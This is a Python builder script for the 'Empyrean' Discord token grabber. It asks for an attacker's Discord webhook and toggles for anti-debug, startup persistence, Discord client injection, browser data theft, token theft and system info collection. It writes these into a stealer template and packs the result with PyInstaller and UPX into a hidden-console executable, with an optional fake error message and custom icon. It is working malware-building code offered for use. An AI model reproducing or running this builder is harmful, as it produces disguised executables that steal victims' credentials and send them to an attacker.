import base64
import requests
import shutil
import subprocess
import os

__BANNER__ = r"""
       _______  ___      ___    _______  ___  ___  _______    _______       __      _____  ___   
      /"     "||"  \    /"  |  |   __ "\|"  \/"  |/"      \  /"     "|     /""\    (\"   \|"  \  
     (: ______) \   \  //   |  (. |__) :)\   \  /|:        |(: ______)    /    \   |.\\   \    | 
      \/    |   /\\  \/.    |  |:  ____/  \\  \/ |_____/   ) \/    |     /' /\  \  |: \.   \\  | 
      // ___)_ |: \.        |  (|  /      /   /   //      /  // ___)_   //  __'  \ |.  \    \. | 
     (:      "||.  \    /:  | /|__/ \    /   /   |:  __   \ (:      "| /   /  \\  \|    \    \ | 
      \_______)|___|\__/|___|(_______)  |___/    |__|  \___) \_______)(___/    \___)\___|\____\) 
     
                                     Made by github.com/addi00000
                                        discord.gg/G52tYpJWnQ
"""
__UPX__ = requests.get("https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip",
                       allow_redirects=True)
__PYINSTALLER__ = requests.get("https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip",
                               allow_redirects=True)
__BUILDENV__ = "./buildenv"
os.makedirs(__BUILDENV__, exist_ok=True)


def main() -> None:
    print(__BANNER__)

    webhook = input("{:<27}: ".format("Discord Webhook?"))
    use_error_message = input("{:<27}: ".format("Use Error Message? (y/n)"))
    if use_error_message.lower() == "y":
        error_message = input("{:<27}: ".format("Error Message?"))
    use_debug = input("{:<27}: ".format("Anti Debug? (y/n)"))
    use_startup = input("{:<27}: ".format("Startup? (y/n)"))
    use_injection = input("{:<27}: ".format("Discord Injection? (y/n)"))
    use_chromium = input("{:<27}: ".format("Browser Data? (y/n)"))
    use_discord = input("{:<27}: ".format("Discord Tokens? (y/n)"))
    use_sysinfo = input("{:<27}: ".format("System Info? (y/n)"))
    exe_icon = input("{:<27}: ".format("Icon? (y/n)"))
    if exe_icon.lower() == "y":
        icon = input("{:<27}: ".format("Icon Path? (drag and drop .ico file)"))
        if not icon.endswith(".ico") or not os.path.exists(icon):
            print("[-] Invalid Icon")
            exit()
    
    shutil.copytree("./src", f"{__BUILDENV__}/src")

    with open(file=f"{__BUILDENV__}/src/main.py", mode="r") as f:
        content = f.read()

    content = content.replace("&WEBHOOK_URL_ENC&", base64.b64encode(webhook.encode("utf-8")).decode("utf-8"))
    if use_error_message.lower() == "y":
        content = content.replace("&ERROR_MESSAGE_ENC&", base64.b64encode(error_message.encode("utf-8")).decode("utf-8"))
        content = content.replace("__USE_ERROR_MESSAGE__ = False", "__USE_ERROR_MESSAGE__ = True")
        
    else:
        content = content.replace("&ERROR_MESSAGE_ENC&", base64.b64encode('NOERRORMESSAGE'.encode("utf-8")).decode("utf-8"))

    if use_debug.lower() == "y":
        content = content.replace("# debug", "debug")
    if use_startup.lower() == "y":
        content = content.replace("# startup", "startup")
    if use_injection.lower() == "y":
        content = content.replace("# injection", "injection")
    if use_chromium.lower() == "y":
        content = content.replace("# chromium", "chromium")
    if use_discord.lower() == "y":
        content = content.replace("# discord", "discord")
    if use_sysinfo.lower() == "y":
        content = content.replace("# sysinfo", "sysinfo")
        
    with open(file=f"{__BUILDENV__}/src/main.py", mode="w") as f:
        f.write(content)

    install_pyinstaller()
    install_upx()

    subprocess.run(
        f'cd {__BUILDENV__} && py -3.10 -m PyInstaller --onefile --noconsole --upx-dir upx/{os.listdir(f"{__BUILDENV__}/upx")[0]} --icon {icon if exe_icon.lower() == "y" else "NONE"} --distpath ../ --key EMPRYREAN --name built ./src/main.py', shell=True)

    shutil.rmtree(__BUILDENV__)


def install_pyinstaller():
    with open(file=f"{__BUILDENV__}\\pyinstaller.zip", mode="wb") as f:
        f.write(__PYINSTALLER__.content)

    shutil.unpack_archive(
        f"{__BUILDENV__}\\pyinstaller.zip", f"{__BUILDENV__}\\pyinstaller")

    os.remove(f"{__BUILDENV__}\\pyinstaller.zip")

    subprocess.run('pip uninstall -y pyinstaller', shell=True)
    subprocess.run(
        f'cd {__BUILDENV__}/pyinstaller/pyinstaller-5.1/bootloader/ && py -3.10 ./waf all --target-arch=64bit', shell=True)
    subprocess.run(
        f'cd {__BUILDENV__}/pyinstaller/pyinstaller-5.1/ && py -3.10 setup.py install', shell=True)


def install_upx():
    with open(file=f"{__BUILDENV__}\\upx.zip", mode="wb") as f:
        f.write(__UPX__.content)

    shutil.unpack_archive(f"{__BUILDENV__}\\upx.zip", f"{__BUILDENV__}\\upx")
    os.remove(f"{__BUILDENV__}\\upx.zip")


if __name__ == "__main__":
    main()
